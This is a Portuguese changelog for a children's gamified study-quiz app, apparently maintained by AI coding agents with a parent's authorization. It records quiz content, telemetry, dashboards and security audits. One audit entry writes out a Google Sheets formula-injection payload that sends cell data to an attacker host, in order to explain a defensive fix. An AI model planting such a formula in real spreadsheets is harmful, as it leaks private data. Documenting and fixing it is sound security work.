# Changelog

## 2026-09-07 — Substituição de Hugo preservando o link público

Marco autorizou publicar e manter o endereço
`https://mattusca.github.io/missao-estudos/2026-09-hugo-cabret-y5.html`.
O build usa `data/publication-routes.json` para gerar nesse caminho o conteúdo
do encontro 1, sem redirecionamento e sem duplicação do JSON. A fonte histórica
permanece preservada, e o novo `prova_id` mantém o progresso separado do teste
anterior. O índice apresenta essa entrada uma vez; o encontro 2 retorna para
o endereço compartilhado. Guias e README refletem a substituição.

Doze testes locais aprovados, incluindo igualdade entre os HTMLs do endereço
antigo e do primeiro encontro, navegação de volta e identidade do progresso.
O auditor independente identificou uma fila offline que ficaria sem reenvio
após a troca de identidade. Corrigido: o encontro 1 migra os eventos antigos,
deduplica por identidade e só remove a origem após gravar a nova fila. Uma falha
de armazenamento preserva a origem. A correção foi rechecada e aprovada pelo auditor.
A implantação usa o workflow existente com o segredo de telemetria.
Publicado no commit `1c33536`: [Action concluído com sucesso](https://github.com/mattusca/missao-estudos/actions/runs/34146074968).
As três páginas responderam HTTP 200 com as identidades, os links e a configuração
de telemetria esperados. O endereço original foi aberto no navegador e o mapa do
primeiro encontro foi conferido visualmente com Marco (teste), sem enviar respostas.
Resta ao responsável conferir o acesso no aparelho usado para estudar.

## 2026-09-07 — Hugo: ensino, aplicação e recuperação em três encontros

Implementada, com autorização de Marco, sequência para 07–08/09 antes da prova
de 09/09. Cada novo arquivo tem `prova_id` próprio e 12 questões. Encontros 1 e 2
trabalham os seis temas em blocos, com 24 questões inéditas cada; o terceiro
mistura três temas por missão e usa o banco do segundo, preservando identidades.
O uso do terceiro encontro depende de base e disposição, não do placar.
O roteiro `guides/hugo-study-sequence.md` orienta leitura do livro, conversa
breve, intervalos e ajustes após a leitura do próximo log. Não há adaptação automática.

Conteúdo escrito por agente Sol e implementação delimitada por Terra, em paralelo.
Revisores independentes examinaram conteúdo e engenharia após a implementação.
Os seis grupos de achados pedagógicos foram corrigidos e rechecados: ambiguidade
de gabarito, ordem já entregue no enunciado, definições no cartão de apoio,
confusão entre imagem e comprovação histórica, distratores pouco plausíveis,
abstrações sem explicação e cronologia não confirmada. A auditoria também conferiu
as três fontes do guia. Dois destaques que fragmentavam palavras foram corrigidos.

Nova ferramenta `investigar`: escolha e confirmação separadas, segunda tentativa
antes da explicação, avanço permitido após concluir mesmo sem acerto, alternativas
embaralhadas e nenhum XP ou evento de questão por usar a ferramenta. Aulas curtas,
fechamentos orais e SVGs originais para enquadramento e sequência de ações.
As demais acomodações foram preservadas. Removido o contador visível da pausa,
mantendo a sugestão de descanso. Mensagens finais deixam de afirmar domínio;
“Rever uma missão” retorna ao mapa sem zerar o progresso. Negritos dentro da cola
deixaram de quebrar o texto em linhas como se fossem títulos.

Novas sessões incluem o `prova_id` no identificador; sessões antigas retomadas
mantêm o ID até expirar. As 28 colunas e o Apps Script não mudaram. Tempos de aula,
ferramenta e leitura do feedback continuam sem medição direta. O build valida a
ferramenta, o perfil de teste e a trilha; o índice apresenta títulos e encontros
em ordem, listando somente HTMLs gerados. O validador editorial passou a aceitar
arquivos por argumento, aulas de uma a três telas e missões intercaladas.

Na versão inicial, corrigidas explicações sobre imagens e fotogramas, distinção
entre ordem e causa e heurísticas de escolha. Alterações que mudaram a demanda
ou o apoio de itens antigos receberam IDs novos (`VOCAB.Q8`, `FORMA.Q8/Q9`);
os novos encontros usam `Q101–Q104` e `Q201–Q204`. Nada reescreve o log histórico.

**Verificação final:** sete builds aprovados, nove testes Node aprovados,
zero erros e avisos editoriais nos três encontros novos. Testes exercitam
tentativas, portão, embaralhamento, sessão legada e nova, banco emprestado,
50 sorteios por encontro e payload de 28 campos. Navegador em 390 × 844,
perfil Marco (teste): encontro 1 completo, interações de revisão e parte do
encontro 3; escolhas, segunda tentativa, ferramentas, figuras, pausas sem contador,
retomada de missão incompleta, XP/medalhas/foco e progresso separado no encontro 2.
Conferidos títulos/links e ausência de transbordamento horizontal nas telas
inspecionadas. Testes locais sem `SHEET_URL`; servidor de teste encerrado e
dimensão do navegador restaurada. Nenhum commit, push ou publicação realizado.

O roteiro da professora e a conferência dos episódios na edição utilizada
continuam pendentes. Não se registraram resultados individuais nesta entrega pública.

## 2026-09-07 — Convivência implementada e guia narrativo compartilhado

Com autorização de Marco, `AGENTS.md` passou a ser uma entrada curta que exige a
leitura do `CLAUDE.md`. A nova seção 0 do arquivo comum define responsabilidades,
passagem de trabalho, preservação das edições existentes e alternância de autoria
e revisão. Ambos podem liderar a narrativa completa; Codex também tem como frente
preferencial engenharia e verificação. As regras pedagógicas anteriores foram preservadas.

Criado `guides/narrative-guide.md`, ligado a ambos os arquivos e ao README: percurso
da missão, voz, função de cada apoio, questões autossuficientes, continuidade com a
interface, verificação factual e fluxo editorial. Revisão independente identificou
uma ambiguidade na missão de referência: corrigida para que revisões intercaladas
continuem sem aula e sem ferramenta. Ajustes pequenos mantêm revisão proporcional.

**Aplicação em Hugo Cabret** — apenas `aula.corpo` e `aula.fechamento` da missão
Enredo foram alterados. O convite às fichas agora começa por "A ordem deixa pistas";
o fechamento orienta lembrar a cena e o que ela tornou possível, removendo a
instrução de consultar uma seta que já não existia no cartão.

**Verificado** — build de Hugo com `SHEET_URL` vazia; validador com 0 erros e os
mesmos 6 avisos de comprimento anteriores à edição; comparação estrutural confirmou
que os dois campos da aula foram as únicas mudanças no JSON; 7 links locais dos
documentos resolvidos. Navegador em 390 × 844, perfil Marco (teste): missão inicial
concluída para abrir Enredo, confirmação em dois toques observada, novo convite e
fechamento legíveis, ferramenta bloqueia avanço até interação. Janela de teste
fechada e tamanho do navegador restaurado; servidor local encerrado ao final.
Conferência factual do livro e alinhamento ao roteiro seguem pendentes. Sem publicação.

## 2026-09-07 — Complemento: papel do Codex na narrativa dos artefatos

Leitura editorial de exemplos das aulas, questões, dicas e explicações de Hugo
Cabret, Language Arts e Matemática. A proposta de responsabilidade foi ampliada:
Codex também pode assumir direção narrativa, coautoria e edição didática, com
alternância entre autor e revisor conforme o artefato. A divisão anterior não
deve ser interpretada como exclusividade de conteúdo para o Claude.

Critérios propostos: cena com função no conteúdo; uma ideia por tela; ligação
entre aula e interação; feedback que explica o raciocínio; voz consistente;
questões autossuficientes para sorteio e intercalação. Revisões intercaladas
preservam recuperação direta, sem acrescentar aula. Exemplo de continuidade
identificado: fechamento de Enredo manda consultar a sequência e a seta seguinte
no cartão, embora a regra atual não apresente essa sequência. Registrado em
pendências. Verificação por leitura dos JSONs e do histórico; conteúdo das provas
e instruções dos agentes não foram alterados.

## 2026-09-07 — Leitura do projeto e proposta de convivência Codex/Claude

Leitura das orientações, README, pendências e histórico, com exploração estática
da arquitetura por subagente. Papel proposto para o Codex: engenharia e revisão
independente de integração, persistência, telemetria e acomodações; continuidade
de conteúdo com o Claude e decisões pedagógicas com Marco. É uma recomendação,
não uma alteração das responsabilidades ou das instruções do repositório.

`CLAUDE.md` e `AGENTS.md` têm conteúdo idêntico (SHA-256 conferido); `AGENTS.md`
já estava não versionado no início. Proposta: manter a referência comum no
`CLAUDE.md`, como orienta o README, e futuramente usar `AGENTS.md` como entrada
curta que exija essa leitura e acrescente instruções operacionais do Codex.
Referência oficial consultada: https://learn.chatgpt.com/docs/agent-configuration/agents-md

**Oportunidades identificadas** — contrato de retenção entre servidor e dashboard
(`questao_id` ausente na seleção de campos do servidor); validador de conteúdo
existente, mas com caminho absoluto e prova fixa, fora do workflow; exemplos de
matemática ainda embutidos no motor. Pendências antigas também divergem do código
e do histórico. Achados registrados para trabalho posterior, sem correção nesta sessão.

**Verificação** — build dos quatro JSONs concluído com sucesso e `SHEET_URL` vazia
no processo; saída local em `docs/`. Comparação das instruções e inspeção do diff
dos registros. Sem teste de navegador ou da implantação: o achado de retenção é
estático e o build não verifica esse contrato. Atualizados somente os registros
em `tasks/`, além das saídas locais geradas. Nenhum commit, push ou envio de eventos.

## 2026-09-07 (tarde) — Hugo Cabret: reescrita narrativa e auditoria

A v1 estava correta e fria: aula em lista, enunciado de gabarito, distrator bobo,
dica que entregava o fato. Reescrita completa do texto das 6 missões, sem mudar
ids, dificuldades, ferramentas, sorteio nem figuras.

**Método** — guia de reescrita (voz única, 3 telas por aula: cena → ideia pelo
exemplo → por que importa; enunciado ancorado numa cena; dica aponta, não entrega;
explicação com o porquê e uma frase que gruda; distrator = confusão real do livro;
"mais didático ≠ mais texto") + ficha de fatos do livro. Três redatores (Sonnet) em
paralelo, dois missões cada; dois auditores independentes (fatos/coerência em Sonnet,
didática/voz em Opus). 35 findings ao todo, todos corrigidos.

**Achados que valem lembrar**
- Alternativa certa 1,5–2,5× mais longa que os distratores em 8 questões: atalho de
  layout que o log leria como domínio. Reequilibrado; o validador agora avisa acima de 1,35×.
- Passos do andaime respondendo a própria pergunta em 6 questões ("…? Georges.").
  Andaime é organização, não dica: cortadas as respostas coladas.
- Cartão de regra entregando gabarito: Linha do tempo (a sequência era a resposta da
  Q3, `alternativas_fixas`), Vocabulário (seis definições = seis gabaritos), Forma
  (revelava o narrador). Cartão virou critério de decisão, como manda a seção 4.
- Fato errado: Étienne não leva Hugo à Academia; Labisse indica, Étienne ajuda lá.
- Quadro da aula grudado na tela 1 em 3 missões (assinatura de autor): movido para a
  tela 2 em todas.
- Títulos viraram lugares da estação (loja de brinquedos, passagens secretas, oficina
  dos relógios, alto do relógio de vidro, caixa de ferramentas, sala de cinema).

**Verificado** — validador final (0 erros): 3 telas por aula, box na tela 2, alvos do
`destacar` casando, `montar` com a ficha nova ("é ela quem gira a chave"), conector com
1 ok por par, passos 3–4 nas de nível 3, tags fechadas. Build OK. No navegador: as 6
aulas fatiam em 5 telas, portão arma e destrava no `montar`.

## 2026-09-07 — Prova de Hugo Cabret Y5 (primeira versão)

Terceira prova do sistema, primeira de Português e primeira sobre um livro.
Proposta em `tasks/proposta-hugo-cabret.md`; implementada sem roteiro da
professora, a partir de guias de leitura (Scholastic, Ferguson Library, Reed Novel
Studies grade 5, SM). **Ajustar ao roteiro quando ele chegar.**

**Catálogo** — seis temas novos `POR.LEI.*` (PERS, SEQ, CAUSA, TEMA, VOCAB, FORMA),
eixo Leitura, com códigos BNCC de 5º ano marcados `bncc_conferida: false`.

**Conteúdo** — `data/provas/2026-09-hugo-cabret-y5.json`: 6 missões, 18 questões por
sessão de um banco de 41, dificuldade média 1,95. Zero mudança no motor: as quatro
ferramentas de língua cobriram tudo (`destacar` ×3, `montar`, `conector` ×2 — a segunda
como lacuna de vocabulário). Duas figuras SVG próprias (Lua com foguete, engrenagens).
Nenhum desenho do Selznick reproduzido; frases do livro em paráfrase. As questões são
autossuficientes de propósito: nenhuma depende do texto do cartão, o que deixa os seis
temas prontos para uma revisão intercalada.

**Decisões da v1** — Português (não Language Arts); sem comparação livro × filme; sem
ferramenta nova `fotogramas` (fica na proposta); sem áudio/audiobook (reexposição em vez
de recuperação, direitos autorais e arquivo único offline); missão de abertura é
Personagens, por ser a mais segura para não ancorar impressão negativa.

**Corrigido durante o teste** — no celular a figura da Lua (viewBox 200×120) empurrava a
1ª alternativa para y=816 numa tela de 812, o mesmo problema que o texto de leitura teve
em LA. Figuras redesenhadas largas e baixas (320×100 e 300×100): 1ª alternativa em
y=731 e y=762.

**Verificado no navegador** (tablet e celular, `node scripts/servir.mjs`): identidade →
mapa → aula fatiada → portão de um toque nas três ferramentas (`destacar`, `montar`,
`conector`) → dois toques → +100 XP com explicação. Por script na página publicada: os
18 alvos de `destacar` casam com as frases, as 3 ordens de `montar` batem com as fichas,
os 8 pares de `conector` têm exatamente uma opção certa, `passos` presentes nas 11
questões de nível 3, ids únicos. Retomada e telemetria são do motor, inalterado.

**Não feito** — revisão intercalada (`2026-09-revisao-hugo-y5`), revisão factual por
adulto que leu a edição SM, e commit/push: ficam para a próxima sessão.

**Ferramental** — `.claude/launch.json` para subir `scripts/servir.mjs` pelo preview.

## 2026-08-25 (noite) — Prática intercalada, portão da aula e retenção

Escopo fechado a partir de pesquisa, não de palpite. Três itens que estavam na lista
foram **cortados** por não terem lastro — e um deles tinha pesquisa contra (ver
"Descartados" em `tasks/todo.md`).

**Motor — missão intercalada** (`missao.intercalada`)
- `sorteio.por_tema: [1,2]` roda o plano de dificuldade **dentro de cada tema**.
  Seis temas × 2 = doze questões.
- Permutação garante que duas questões consecutivas nunca sejam do mesmo tema. Guloso
  por maior grupo restante, com desempate sorteado — o determinístico ciclava na mesma
  ordem de temas e a segunda metade repetia a primeira, decorável.
- A ordem **dentro** do grupo também é sorteada. Sem isso o intercalar tirava sempre o
  primeiro item de cada tema e a missão virava rampa: as seis fáceis, depois as seis
  difíceis, toda vez. Previsível, e jogava o fracasso todo para o fim — que é onde o log
  dela de 25/08 já mostrava queda. Medido depois da correção: dificuldade média plana em
  ~1,50 nas doze posições.
- `missao.regras` vira a **cola**: todas as regras dos temas envolvidos, nenhuma
  destacada. O cartão fixo e a intercalação brigam — se a cola anuncia o tema, a
  discriminação já está feita. A saída foi enunciar o critério de decisão sem o item
  lexical: as quatro famílias de conector estão lá, que *however* é contraste não está.
- **Telemetria passa a ler `q.tema_id ?? m.tema_id`** (idem eixo, subtema, bncc). Sem
  isso as doze linhas mentiriam o mesmo tema e a retenção mediria lixo.
- Missão intercalada não tem aula nem ferramenta: revisão é prática de recuperação, e
  reensinar antes de recuperar anula o efeito.

**Motor — portão da aula**
- Na tela da ferramenta, avançar exige um toque no widget. Veio de medida: no log de
  25/08 a aula ficou com 20% do tempo da sessão — 3,1 s por tela, em 28 telas.
- Detecção por seletor **mais** varredura de `onclick`: `destacar` e `grafico` ligam
  clique em `<span>` e em `<g>` de SVG, que nenhum seletor CSS pega. Ferramenta sem
  controle **não** trava — senão a aluna fica presa.
- Sem temporizador, e `Voltar ao mapa` continua livre estando travado.

**Build**
- Resolve `banco_de: {prova, temas}` em tempo de build, carimbando o contexto em cada
  questão. A revisão não copia questão: a fonte da verdade continua num lugar só.
- Recusa cola incompleta, `por_tema` sem banco que o atenda, `por_tema` junto com
  `dificuldades`, questão intercalada sem tema, e tema fora do catálogo.
- Balanceamento de gabarito só nas `alternativas_fixas` — o motor embaralha o resto.

**Dashboard — retenção**
- Painel "O que ficou de um dia para o outro" e linha por tema: das questões que ela
  reencontrou em **outra sessão e em outro dia**, quantas voltaram certas de primeira.
- Quadro Virou / Manteve / Escorregou / Ainda não. "Virou" é o sinal que vale mais:
  não resolveu sozinha antes, resolveu sozinha no reencontro.
- Limiar próprio de 5 reencontros, somado aos 10 eventos e 3 sessões da seção 2. Abaixo
  disso o card diz "ainda não sei dizer" com a contagem, nunca um número.
- Reencontro no mesmo dia é ignorado (mínimo de 20 h e `sessao_id` diferente). Sem essa
  regra, repetir a missão quatro horas depois marcaria 100% de retenção.

**Conteúdo**
- Language Arts: 42 → **52** questões. Toda missão passa a ter ≥2 em cada nível.
- Matemática: 21 → **42** questões, com `sorteio` derivado das dificuldades que a prova
  já aplicava.
- Novo `data/provas/2026-08-revisao-la-y5.json`: revisão intercalada de 12 questões
  sobre 6 temas, ~5 min, `contexto: revisao_espacada`. Feita para ser repetida **três
  vezes** entre uma prova e outra — o critério é 3 recuperações espaçadas, e mais
  questões numa sessão só não rende.

**Privacidade** — o nome da escola ainda estava cravado em `scripts/extrair.mjs` e era
repetido no changelog ao explicar a própria remoção. Os dois foram limpos. O histórico
do Git continua com ele desde o primeiro push.

**Auditoria** — suíte que extrai as funções reais do **HTML publicado** (não do fonte,
não de cópia). Achados corrigidos nesta rodada: rampa de dificuldade, plural do resumo do
build, "Esse tema você domina" numa missão de seis temas, preview do dashboard sem
`questao_id` (a tela nova era inauditável), e o nome da escola. Verificado no navegador:
identidade → mapa → quiz direto, cola com 6 regras, zero adjacências de tema, 12 linhas
com 6 temas distintos, 14 ferramentas travando e destravando com um toque, modo foco sem
confete, e retomada descartando a posição sem apagar linha já emitida.

**Reserva** — 8 questões de nível 3 em Language Arts existem e **não saem hoje**: o plano
das missões não pede nível 3. É headroom deliberado para a próxima calibragem, e a
auditoria imprime isso a cada rodada para não virar conteúdo esquecido.


## 2026-08-25 — Banco de questões e alternativas embaralhadas

A Alícia fechou a prova de Language Arts (21/21, 7 missões, uma sessão). O log
mostrou que da 3ª missão em diante a aula recebeu ~10 s — quatro telas em dez
segundos é tocar em "próximo", não ler. Refazer uma missão, do jeito que estava,
seria conferir memória em vez de praticar.

**Motor**
- `missao.sorteio.dificuldades` (ex.: `[1,2,2]`): o tamanho é quantas questões a
  sessão aplica, cada item é a dificuldade daquela posição. Sorteio novo a cada
  abertura da missão, sem repetir questão dentro da mesma tentativa.
- Missão sem `sorteio` aplica tudo na ordem escrita — a prova de matemática não
  precisou de uma linha de mudança.
- Alternativas embaralhadas a cada abertura, com o gabarito remapeado.
  `questao.alternativas_fixas: true` protege as questões cuja ordem tem sentido.
- `qsAtivas` é memória só: missão abandonada já recomeçava pela aula, então
  nunca há tela de desafio sem `openModule` ter passado antes.
- Bônus de confete assumia missão de 3 questões (`c===3`); agora usa o tamanho
  real do sorteio.

**Por que sortear e não gerar questão**
Banco escolhe entre questões escritas à mão, então `questao_id` continua estável
e retenção continua mensurável. Gerador produziria item novo a cada evento —
nunca se acumularia evidência sobre um item — e a dificuldade viraria rótulo de
template, que é uma média, não a dificuldade daquela instância.

**Build**
- Recusa a prova se o banco não tiver questões suficientes de cada nível pedido.
  Sem isso o motor cai no fallback e aplica questão fora do nível declarado em
  silêncio, que é o pior jeito de a dificuldade declarada deixar de ser verdade.
- O check de gabarito decorável passou a olhar só as questões `alternativas_fixas`:
  balancear à mão o que o motor embaralha não significa nada.

**Conteúdo**
- Language Arts: banco de 21 → 42 questões, 6 por missão, exatamente o dobro do
  sorteio em cada nível. Os ids Q1–Q3 ficaram intactos — já existem no log.

**Verificação**
- Suíte extraindo as funções reais do `motor.html` (não uma cópia): plano de
  dificuldade respeitado, sem repetição, banco inteiro coberto em 400 sorteios,
  gabarito preservado e passando pelas 4 posições, `alternativas_fixas` intocada,
  prova sem sorteio inalterada, banco capenga não encurta a missão.
- No navegador: 8 aberturas da mesma missão deram 6 conjuntos distintos; gabarito
  remapeado aceito na posição nova; 2ª tentativa, dica e medalha íntegras; a
  prova de matemática segue com figura e ordem original.

# Changelog

## 2026-08-24 — Repositório e circuito de ponta a ponta

Protótipo monolítico virou base reaproveitável. Nenhuma prova nova.

**Repositório**
- `git init`, commit inicial com motor, primeira prova e convenções.
- `docs/` versionado de propósito: é a saída publicada pelo GitHub Pages.

**Dados (etapa 0)** — `59c87f0`
- `regra` repopulada nas 7 missões. Vinham `null` desde a extração do monolito:
  o texto do cartão de regra só existia dentro do motor.
- `PASSOS` virou `questao.passos`, ancorado no `questao_id` em vez do índice.
- `{{GRAFICO_LIVROS}}` eliminado. `figura` virou objeto tipado:
  `{tipo:'barras',fonte:'missao'}` lê `missao.dados.serie`; `{tipo:'svg',...}`
  cobre desenhos avulsos.
- `build.mjs` recusa missão sem regra, passos malformados e figura desconhecida.

**Motor lê o JSON (etapa 1)** — `cc28cf6`
- Saiu o array `modules` com as 7 missões embutidas; entra `<script id="prova-data">`.
- `modules.reverse()` removido — a ordem é decidida na criação da prova.
- Vocabulário do motor passa a ser o do JSON.
- `KEY` e `FILA` incluem `prova_id`.
- Rótulos e contagens derivam de `missoes.length` e dos metadados.
- Guarda dupla para ferramenta inexistente: no build e no runtime.

**Telemetria por questão (etapa 2)** — `484ac0c`
- Uma linha por questão respondida, 28 campos da seção 5 do CLAUDE.md.
- Saem as linhas de resumo por missão e por jornada.
- Tempo até o primeiro toque e total; `tempo_valido=false` com saída de tela
  (Page Visibility) ou acima de 3 min. Nada disso aparece na tela.
- `sessao_id` sobrevive a fechar a aba; voltar marca `retomada=true`.
- `SHEET_URL` sai do código e passa a ser injetada por `build.mjs` do ambiente.
- `apps-script/enviar.gs` reescrito, com dedup por `evento_id`.
- Corrigido: a fila só era drenada em abertura do zero, nunca numa retomada.
- Corrigido: medalha e bônus assumiam 3 questões por missão.

**Verificado no navegador** (`node scripts/servir.mjs`)
Ordem das missões, aula fatiada, ferramenta interativa, cartão de regra com
texto, andaime uma etapa por vez, dois toques, 2ª tentativa, escudo, modo foco,
pausa na 2ª e 4ª missão, retomada após recarregar, e as 21 linhas de uma
jornada completa com as 28 colunas batendo com as do Apps Script.

**Não verificado por mim**: gravação real na planilha (depende da implantação
do Apps Script) e comportamento no aparelho da Alícia.

## 2026-08-24 — Correções e identidade do usuário

- **fix**: `isOpen()` lia `missoes[i-1].id`, campo extinto na etapa 1. Nenhuma missão
  destravava depois da primeira. `build.mjs` passa a recusar vocabulário extinto.
- **fix**: "Copiar resultados" duplicava tudo que foi respondido depois da última
  recarga — cada linha vive na fila E na lista da aba. Agora deduplica por `evento_id`.
  O envio à planilha nunca teve esse problema.
- **feat**: sair da missão pelo mapa, descartando o parcial. XP e telemetria ficam.
- **feat**: `prova.alunas` (lista) substitui `prova.aluna`. O motor pergunta uma vez
  por aparelho quem está estudando e grava na coluna `aluna`. Motivo: teste de adulto
  gravado no nome dela envenena a calibragem — responde rápido demais e acerta demais.
- Planilha criada no Drive: "Missão Estudos — log de questões", em
  01. Família & Pessoas › 04. Alícia › Educação. Nome neutro porque a recomendação é
  **uma base para as duas filhas**, separadas pela coluna `aluna`.

## 2026-08-24 — Publicação e dashboard dos pais

- Repo público em github.com/mattusca/missao-estudos; Pages servindo `docs/` com
  `noindex` + robots.txt. Histórico reescrito ANTES do push para remover o
  contexto clínico do CLAUDE.md → `CONTEXTO-PRIVADO.md` (gitignorado).
- **feat**: dashboard de acompanhamento (`apps-script/dashboard.html`), servido
  pelo Apps Script em segunda implantação; acesso = compartilhamento da planilha.
  Por tema: acerto sem apoio com estado "ainda não sei" (<10 eventos ou <3
  sessões), evolução por sessão, barras por dificuldade, contagem de apoios.
  Uma aluna por vez; `(teste)` filtrado no servidor e no cliente.
- `scripts/preview-dash.mjs`: preview com dados sintéticos (4 estados do card +
  linha de teste a filtrar), verificado no navegador. Saída no temp, nunca em docs/.
- **ci**: `.github/workflows/publicar.yml` — build de todas as provas com a
  `SHEET_URL` vinda de secret e publicação no Pages. Fonte do Pages migrada de
  "branch main /docs" para "GitHub Actions". Publicar passou a ser dar push.
- `docs/` saiu do versionamento (`.gitignore`): era a única via pela qual a URL
  do Apps Script voltaria a um repositório público. Um passo do Action aborta a
  publicação se uma URL real de implantação aparecer em arquivo versionado —
  o `{30,}` no padrão separa URL real dos placeholders da documentação.
- `lerEventos_` passa a mapear pelo cabeçalho da planilha, não pela posição fixa:
  uma coluna movida à mão faria o dash ler o campo errado em silêncio.

## 2026-08-24 — Correcao da barra de XP

- **fix**: `.hud .xpfill` era um `<span>` inline, e em elemento inline `width` e
  `height` nao se aplicam: a barra ficava 0x0. O numero de XP subia e a barra ao
  lado ficava vazia em qualquer nivel, desde o prototipo. `display:block` resolve.
  Verificado no navegador: 0%/50%/100% respondem (0 / 79 / 158 px num trilho de 160).

## 2026-08-24 — Prova de Language Arts Y5

Segunda prova do sistema, primeira fora de matemática. Base: roteiro da
professora, prova em 26/08.

**Motor** — 4 ferramentas de língua, genéricas e parametrizadas por `missao.dados`
como o `grafico`. A próxima prova de língua não deve precisar tocar no motor.
- `conector` — troca a palavra do meio e o sentido muda junto.
- `destacar` — toca frases do texto e vê a função de cada uma.
- `montar` — fichas embaralhadas para ordenar. Duas granularidades: palavras
  (gramática) e frases inteiras (sequência narrativa).
- `transformar` — toca a palavra e ela cicla entre as formas.
- Cartão de regra passa a renderizar `dados.texto` abaixo da regra. O texto de
  leitura vive num lugar só, pelo mesmo motivo da série do gráfico.

**Corrigido durante o teste**
- `montar` entregava as fichas na ordem correta: resolvia sozinho da esquerda
  para a direita e não ensinava nada. Agora embaralha, e regira se o sorteio
  cair na ordem certa.
- No celular o texto de leitura empurrava a 1ª alternativa para baixo da dobra
  (y=776 numa tela de 812) — ela teria de rolar até o fim para escolher e voltar
  ao topo para reler, que é a carga que o cartão fixo existe para tirar. Teto de
  altura com rolagem interna: 53% → 37% da tela. No tablet cabe tudo numa tela.

**Conteúdo** — 7 missões, 21 questões, gabarito 5/5/6/5, dificuldade média 1.81.
Enunciados em inglês, andaime em português: o apoio existe para tirar carga, e em
L2 viraria mais uma coisa a decodificar. `Writing: Narrative` não cabe em múltipla
escolha e virou *narrative craft* — sequência, abertura, show vs tell.

**Privacidade** — `escola` passa do nome da escola para o código `"PD"`. O nome
estava no JSON versionado e na página publicada, ao lado do primeiro nome e do ano.
Ressalva: o histórico do Git já o contém desde o primeiro push.

**Verificado no navegador** — as 4 ferramentas respondendo ao toque; gate do mapa
destravando só a missão seguinte (testado pelo mapa, não por `openModule`); dois
toques; 2ª tentativa sem revelar gabarito; escudo; andaime um passo por toque;
modo foco; retomada com XP, medalhas, foco e identidade; jornada completa com 21
linhas de 28 colunas, `bncc: null` e `escola: PD`.

**BNCC** — Língua Inglesa só existe na BNCC a partir do 6º ano. Os 7 temas `ING.*`
entram com `habilidade_bncc: null`, não com código inventado.

## 2026-08-24 — Identidade primeiro, progresso por pessoa

- **feat**: "Quem está estudando?" passa a ser a primeira tela de toda sessão, não
  só da estreia do aparelho. Com Marco e Fernanda testando no mesmo tablet da
  Alícia, perguntar uma vez gravaria linha no nome errado. O último nome escolhido
  vem marcado ("última vez"), então o caminho de sempre continua custando um toque.
- **fix**: progresso era por prova e por APARELHO — `missao_progresso_<prova>_v2`.
  Os três dividiam o mesmo XP, medalhas e mapa. Um teste de adulto entregaria à
  Alícia o jogo já ganho: 7 medalhas e o mapa inteiro aberto antes de ela começar.
  A chave passa a incluir a pessoa e virou função, porque só pode ser resolvida
  depois da escolha. Trocar de pessoa recarrega o estado dela, não só redesenha o mapa.
- **fix**: o HUD aparecia sobre a tela de escolha mostrando "Nível 1 · 0 XP" —
  placar de ninguém, que ainda mudava sozinho quando o progresso carregava.

**Verificado no navegador** — Marco joga a missão 1 (480 XP, 1 medalha); Alícia abre
e encontra 0 XP, nenhuma medalha e 6 de 7 travadas; voltando ao Marco, os 480 XP e a
missão 2 aberta reaparecem. Duas chaves separadas no localStorage. Nas duas provas.

## 2026-08-25 — Circuito fechado de ponta a ponta

Marco implantou o Apps Script (duas implantações) e a `SHEET_URL` entrou como
secret do repositório. O build passou a imprimir "envio para a planilha: ATIVO".

**Verificado de ponta a ponta, na página publicada**
- Ping da telemetria responde; o gate do `doGet` recusa servir o dashboard pela
  URL pública, como projetado.
- Dashboard anônimo → 302 para o login do Google. O acesso é o compartilhamento
  da planilha, não senha no código.
- Questão respondida no navegador vira linha na aba `Eventos`: cabeçalho
  autogerado com as 28 colunas e o evento completo (`Marco (teste)`,
  `ING.ESC.CONECT.Q1`, `acerto_1a`, `escola PD`, `BNCC` vazio).
- Tempo até o 1º toque medido corretamente: 4,2 s para uma pausa de 4,2 s.
  O `0` da primeira linha era clique automático instantâneo, não defeito.
- A URL está na página publicada e **não** no repositório — `git grep` limpo.

Ficam na planilha 2 linhas de `Marco (teste)` deste teste. São filtradas no
dashboard (servidor e cliente) e não entram na calibragem.

## 2026-08-25 — Auditoria de injection

Revisão dos pontos onde dado externo vira HTML ou célula de planilha.

- **fix (sério)**: injeção de fórmula no Sheets. O `doPost` é público de
  propósito e a URL está no HTML publicado — qualquer um que veja o fonte da
  página consegue gravar linhas. O Sheets trata string começada por `= + - @`
  como fórmula, então dava para plantar `=IMAGE("http://atacante/"&A2)`: o
  Sheets buscaria a imagem e o conteúdo da célula sairia dentro da URL do
  request. Numa planilha com nome e desempenho de crianças, isso é vazamento.
  `celula_` passa a prefixar apóstrofo nesses casos e a limitar strings a 300
  caracteres. Números e booleanos passam intactos.
- **fix**: `</script>` dentro do JSON da prova fecharia a tag cedo no
  `build.mjs`, transformando o resto em HTML executável. O JSON contém HTML de
  propósito (regra, aula), então é armadilha para nós mesmos no dia em que uma
  questão precisar falar da tag. `<` vira `\u003c`; o `JSON.parse` desfaz.
  O `<title>` também passou a ser escapado. O dashboard já fazia isso.

**Sem achado**: o dashboard escapa todo campo de texto vindo da planilha
(`aluna`, `materia`, `tema_id`, `subtema`); os demais são números calculados.
As ferramentas de língua usam `textContent`, não `innerHTML`. Bloquear linha
legítima via dedup é impraticável — `evento_id` carrega id aleatório.

**Risco aceito e conhecido**: qualquer um com a URL pode gravar linhas
plausíveis (poluir o log). Não há como autenticar sem pôr segredo no HTML
público, o que não resolveria nada. A coluna `aluna` e o filtro `(teste)`
limitam o estrago à calibragem, não ao acesso.

## 2026-08-25 — Segunda rodada da auditoria de segurança

- **fix**: com SHEET_URL malformada, o `build.mjs` imprimia o VALOR no erro — e
  esse build roda no Actions de repositório público, cujo log é público. O
  cenário exato do erro (espaço no fim, colagem dupla) é o em que o valor ainda
  é a URL real. A mensagem passa a omitir o valor e dizer só o tamanho.
- **fix**: os dois servidores locais escutavam em todas as interfaces
  (LAN inteira) e a checagem `startsWith(RAIZ)` aceitava diretório irmão de
  mesmo prefixo (`docs-x`). Agora: bind em 127.0.0.1 e prefixo fechado com
  `path.sep`. Provado com o predicado real: o irmão de prefixo era SERVIDO
  pela versão antiga e é 403 na nova; traversal (encodado, backslash) barrado
  nas duas; caminhos legítimos e raiz intactos.

**Sem achado nesta rodada**: atributos de aspas simples no dashboard (não há);
`timestamp` vira objeto Date, nunca string em célula; `innerHTML` das
ferramentas de matemática usa apenas valores internos; identidade renderizada
restrita à lista `alunas` do JSON de build; regex da SHEET_URL ancorado no host
exato (script.google.com.evil.com rejeitado — testado).

## 2026-08-25 — Proteção anti-fórmula verificada no endpoint

O primeiro redeploy não pegou: o `/exec` seguia na versão antiga mesmo com o
`Código.gs` salvo. Detectado por teste, não por leitura — uma linha com
